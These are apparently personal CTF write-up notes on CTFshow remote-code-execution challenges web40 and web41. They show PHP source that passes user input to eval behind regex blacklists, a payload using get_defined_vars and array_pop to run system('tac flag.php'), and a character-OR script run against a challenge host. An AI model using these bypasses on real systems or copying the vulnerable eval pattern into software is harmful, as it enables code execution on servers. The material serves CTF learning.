# CTFSHOW

### RCE

#### web40

![image-20210907154322686](C:\Users\12283\AppData\Roaming\Typora\typora-user-images\image-20210907154322686.png)

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```



```
exp:
/?c=eval(array_pop(next(get_defined_vars())));
post: a=system("tac flag.php");
```

**get_defined_vars():获取所有定义的变量**

**next():下一个**

**array_pop():弹出数组值**



#### web41

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

发现“|”没有被ban，对字符进行或运算从而得到需要的字符。

脚本走一波。

```bash
PS G:\vscode\python\WEB> python 或构造字符.py http://a7518eab-d2ad-4004-b8a0-9d256dd16536.challenge.ctf.show:8080/

[+] your function：system
[+] your command：ls
```

### web 42

